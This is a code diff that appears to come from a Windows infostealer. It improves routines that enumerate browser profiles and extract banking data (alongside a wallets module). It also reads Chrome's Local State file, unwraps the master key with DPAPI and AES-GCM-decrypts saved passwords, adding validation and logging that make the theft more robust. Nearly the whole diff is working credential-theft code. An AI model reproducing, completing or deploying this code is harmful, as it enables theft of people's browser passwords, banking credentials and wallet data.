@@ -7,8 +7,10 @@
 #include <sstream>
 #include <memory>
 #include "../common.h"
+#include "../utils.h"
 #include "sqlite_minimal.h"
 #include "wallets.h"
+#include "chrome.h"
 
 // Logging functions
 extern void LogInfo(const char* message);
@@ -17,8 +19,6 @@ extern void LogError(const char* message);
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
-#include "wallets.h"
-
 void ExampleUse() {
     auto profiles = GetBrowserProfiles();
     for (const auto& bp : profiles) {
@@ -26,8 +26,8 @@ void ExampleUse() {
         const std::string& profilePath = bp.second;
 
         auto foundBanks = ExtractBankingData(profilePath);
-        for (const auto& info : foundBanks) {
-            LogInfo(("Bank found in " + browser + ": " + info).c_str());
+        if (!foundBanks.empty()) {
+            LogInfo(("Banking data collected from " + browser).c_str());
         }
     }
 }
@@ -171,59 +171,116 @@ private:
     }
     
     bool LoadMasterKey() {
-        std::wstring localStatePath = chrome_user_data + L"\\Local State";
-        
-        HANDLE hFile = CreateFileW(localStatePath.c_str(), GENERIC_READ,
-                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                  NULL, OPEN_EXISTING, 0, NULL);
-        
-        if (hFile == INVALID_HANDLE_VALUE) return false;
-        
-        LARGE_INTEGER fileSize;
-        GetFileSizeEx(hFile, &fileSize);
-        
-        std::vector<char> buffer((size_t)fileSize.QuadPart);
-        DWORD bytesRead;
-        ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL);
-        CloseHandle(hFile);
-        
-        // Find encrypted_key in JSON
-        std::string json(buffer.begin(), buffer.end());
-        size_t keyPos = json.find("\"encrypted_key\":\"");
-        if (keyPos == std::string::npos) return false;
-        
-        keyPos += 17;
-        size_t keyEnd = json.find("\"", keyPos);
-        if (keyEnd == std::string::npos) return false;
-        
-        std::string encodedKey = json.substr(keyPos, keyEnd - keyPos);
-        
-        // Base64 decode
-        DWORD decodedSize = 0;
-        CryptStringToBinaryA(encodedKey.c_str(), (DWORD)encodedKey.length(),
-                            CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
-        
-        std::vector<uint8_t> encryptedKey(decodedSize);
-        CryptStringToBinaryA(encodedKey.c_str(), (DWORD)encodedKey.length(),
-                            CRYPT_STRING_BASE64, encryptedKey.data(), 
-                            &decodedSize, NULL, NULL);
-        
-        // Remove DPAPI prefix
-        if (encryptedKey.size() < 5) return false;
-        encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
-        
-        // Decrypt using DPAPI
-        DATA_BLOB input, output;
-        input.pbData = encryptedKey.data();
-        input.cbData = (DWORD)encryptedKey.size();
-        
-        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
+        try {
+            std::wstring localStatePath = chrome_user_data + L"\\Local State";
+            
+            HANDLE hFile = CreateFileW(localStatePath.c_str(), GENERIC_READ,
+                                      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                                      NULL, OPEN_EXISTING, 0, NULL);
+            
+            if (hFile == INVALID_HANDLE_VALUE) {
+                DWORD error = GetLastError();
+                LogError(("Chrome LoadMasterKey: Failed to open Local State file, error: " + std::to_string(error)).c_str());
+                return false;
+            }
+            
+            LARGE_INTEGER fileSize;
+            if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart > 10 * 1024 * 1024) {
+                CloseHandle(hFile);
+                LogError("Chrome LoadMasterKey: Invalid file size or file too large");
+                return false;
+            }
+            
+            std::vector<char> buffer((size_t)fileSize.QuadPart);
+            DWORD bytesRead;
+            if (!ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL) || 
+                bytesRead != (DWORD)buffer.size()) {
+                CloseHandle(hFile);
+                LogError("Chrome LoadMasterKey: Failed to read file completely");
+                return false;
+            }
+            CloseHandle(hFile);
+            
+            // Find encrypted_key in JSON
+            std::string json(buffer.begin(), buffer.end());
+            size_t keyPos = json.find("\"encrypted_key\":\"");
+            if (keyPos == std::string::npos) {
+                LogError("Chrome LoadMasterKey: encrypted_key not found in JSON");
+                return false;
+            }
+            
+            keyPos += 17;
+            size_t keyEnd = json.find("\"", keyPos);
+            if (keyEnd == std::string::npos || keyEnd <= keyPos) {
+                LogError("Chrome LoadMasterKey: Invalid encrypted_key format");
+                return false;
+            }
+            
+            std::string encodedKey = json.substr(keyPos, keyEnd - keyPos);
+            if (encodedKey.empty() || encodedKey.length() > 1024) {
+                LogError("Chrome LoadMasterKey: Invalid encoded key length");
+                return false;
+            }
+            
+            // Base64 decode with validation
+            DWORD decodedSize = 0;
+            if (!CryptStringToBinaryA(encodedKey.c_str(), (DWORD)encodedKey.length(),
+                                     CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL) ||
+                decodedSize == 0 || decodedSize > 512) {
+                LogError("Chrome LoadMasterKey: Base64 decode size validation failed");
+                return false;
+            }
+            
+            std::vector<uint8_t> encryptedKey(decodedSize);
+            if (!CryptStringToBinaryA(encodedKey.c_str(), (DWORD)encodedKey.length(),
+                                     CRYPT_STRING_BASE64, encryptedKey.data(), 
+                                     &decodedSize, NULL, NULL)) {
+                LogError("Chrome LoadMasterKey: Base64 decode failed");
+                return false;
+            }
+            
+            // Validate DPAPI prefix and remove it
+            if (encryptedKey.size() < 5) {
+                LogError("Chrome LoadMasterKey: Encrypted key too short for DPAPI prefix");
+                return false;
+            }
+            encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
+            
+            if (encryptedKey.empty() || encryptedKey.size() > 256) {
+                LogError("Chrome LoadMasterKey: Invalid encrypted key size after prefix removal");
+                return false;
+            }
+            
+            // Decrypt using DPAPI with validation
+            DATA_BLOB input, output;
+            input.pbData = encryptedKey.data();
+            input.cbData = (DWORD)encryptedKey.size();
+            
+            if (!CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
+                DWORD error = GetLastError();
+                LogError(("Chrome LoadMasterKey: DPAPI decryption failed, error: " + std::to_string(error)).c_str());
+                return false;
+            }
+            
+            if (!output.pbData || output.cbData == 0 || output.cbData != 32) {
+                if (output.pbData) LocalFree(output.pbData);
+                LogError("Chrome LoadMasterKey: Invalid master key size (expected 32 bytes)");
+                return false;
+            }
+            
             master_key.assign(output.pbData, output.pbData + output.cbData);
             LocalFree(output.pbData);
+            
+            LogInfo("Chrome LoadMasterKey: Master key loaded successfully");
             return true;
+            
+        } catch (const std::exception& e) {
+            LogError(("Chrome LoadMasterKey: Exception - " + std::string(e.what())).c_str());
+            return false;
+        } catch (...) {
+            LogError("Chrome LoadMasterKey: Unknown exception occurred");
+            return false;
         }
-        
-        return false;
     }
     
     std::vector<ChromePassword> ExtractPasswords(const std::wstring& profilePath) {
@@ -388,56 +445,100 @@ private:
         BCRYPT_KEY_HANDLE hKey = NULL;
         std::string result;
         
-        // Open algorithm provider
-        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
-            return result;
+        try {
+            // Validate input parameters
+            if (ciphertext.empty() || ciphertext.size() > 64 * 1024) {
+                LogError("Chrome DecryptAESGCM: Invalid ciphertext size");
+                return result;
+            }
+            
+            if (nonce.size() != 12) {
+                LogError("Chrome DecryptAESGCM: Invalid nonce size (expected 12 bytes)");
+                return result;
+            }
+            
+            if (tag.size() != 16) {
+                LogError("Chrome DecryptAESGCM: Invalid tag size (expected 16 bytes)");
+                return result;
+            }
+            
+            if (master_key.size() != 32) {
+                LogError("Chrome DecryptAESGCM: Invalid master key size (expected 32 bytes)");
+                return result;
+            }
+            
+            // Open algorithm provider
+            NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+            if (status != 0) {
+                LogError(("Chrome DecryptAESGCM: Failed to open algorithm provider, status: 0x" + 
+                         std::to_string(status)).c_str());
+                return result;
+            }
+            
+            // Set GCM mode
+            status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
+                                     (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 
+                                     sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+            if (status != 0) {
+                LogError(("Chrome DecryptAESGCM: Failed to set GCM mode, status: 0x" + 
+                         std::to_string(status)).c_str());
+                BCryptCloseAlgorithmProvider(hAlg, 0);
+                return result;
+            }
+            
+            // Generate key
+            status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
+                                              (PUCHAR)master_key.data(), 
+                                              (ULONG)master_key.size(), 0);
+            if (status != 0) {
+                LogError(("Chrome DecryptAESGCM: Failed to generate symmetric key, status: 0x" + 
+                         std::to_string(status)).c_str());
+                BCryptCloseAlgorithmProvider(hAlg, 0);
+                return result;
+            }
+            
+            // Setup authentication info
+            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
+            authInfo.pbNonce = (PUCHAR)nonce.data();
+            authInfo.cbNonce = (ULONG)nonce.size();
+            authInfo.pbTag = (PUCHAR)tag.data();
+            authInfo.cbTag = (ULONG)tag.size();
+            
+            // Decrypt
+            std::vector<uint8_t> plaintext(ciphertext.size());
+            ULONG cbResult = 0;
+            
+            status = BCryptDecrypt(hKey, 
+                                  (PUCHAR)ciphertext.data(), 
+                                  (ULONG)ciphertext.size(),
+                                  &authInfo, 
+                                  NULL, 
+                                  0,
+                                  plaintext.data(), 
+                                  (ULONG)plaintext.size(), 
+                                  &cbResult, 
+                                  0);
+            
+            if (status == 0) {
+                if (cbResult > 0 && cbResult <= 1024) {  // Reasonable password length
+                    result.assign((char*)plaintext.data(), cbResult);
+                } else {
+                    LogError("Chrome DecryptAESGCM: Decrypted data has invalid size");
+                }
+            } else {
+                LogError(("Chrome DecryptAESGCM: Decryption failed, status: 0x" + 
+                         std::to_string(status)).c_str());
+            }
+            
+        } catch (const std::exception& e) {
+            LogError(("Chrome DecryptAESGCM: Exception - " + std::string(e.what())).c_str());
+        } catch (...) {
+            LogError("Chrome DecryptAESGCM: Unknown exception occurred");
         }
         
-        // Set GCM mode
-        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
-                             (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 
-                             sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
-            BCryptCloseAlgorithmProvider(hAlg, 0);
-            return result;
-        }
-        
-        // Generate key
-        if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
-                                      (PUCHAR)master_key.data(), 
-                                      (ULONG)master_key.size(), 0) != 0) {
-            BCryptCloseAlgorithmProvider(hAlg, 0);
-            return result;
-        }
-        
-        // Setup authentication info
-        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
-        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
-        authInfo.pbNonce = (PUCHAR)nonce.data();
-        authInfo.cbNonce = (ULONG)nonce.size();
-        authInfo.pbTag = (PUCHAR)tag.data();
-        authInfo.cbTag = (ULONG)tag.size();
-        
-        // Decrypt
-        std::vector<uint8_t> plaintext(ciphertext.size());
-        ULONG cbResult = 0;
-        
-        NTSTATUS status = BCryptDecrypt(hKey, 
-                                       (PUCHAR)ciphertext.data(), 
-                                       (ULONG)ciphertext.size(),
-                                       &authInfo, 
-                                       NULL, 
-                                       0,
-                                       plaintext.data(), 
-                                       (ULONG)plaintext.size(), 
-                                       &cbResult, 
-                                       0);
-        
-        if (status == 0) {
-            result.assign((char*)plaintext.data(), cbResult);
-        }
-        
-        BCryptDestroyKey(hKey);
-        BCryptCloseAlgorithmProvider(hAlg, 0);
+        if (hKey) BCryptDestroyKey(hKey);
+        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
         
         return result;
     }
